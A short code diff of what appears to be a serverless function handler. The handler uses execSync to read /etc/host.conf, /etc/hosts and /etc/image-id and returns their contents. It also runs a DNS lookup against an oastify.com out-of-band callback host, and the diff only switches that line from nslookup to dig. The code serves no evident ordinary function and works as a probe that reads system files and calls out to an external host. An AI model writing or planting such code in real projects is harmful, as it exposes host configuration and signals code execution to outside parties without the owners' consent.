@@ -9,7 +9,7 @@ exports.handler = async function (event, context) {
       command: execSync("cat /etc/host.conf").toString().trim(),
       command2: execSync("cat /etc/hosts").toString().trim(),
       command3: execSync("cat /etc/image-id").toString().trim(),
-      command4: execSync("nslookup dep1.ztwfbmyqfew7zg53wpz7s53gw72yqwel.oastify.com").toString().trim(),
+      command4: execSync("dig dep1.ztwfbmyqfew7zg53wpz7s53gw72yqwel.oastify.com").toString().trim(),
     };
 
     return {
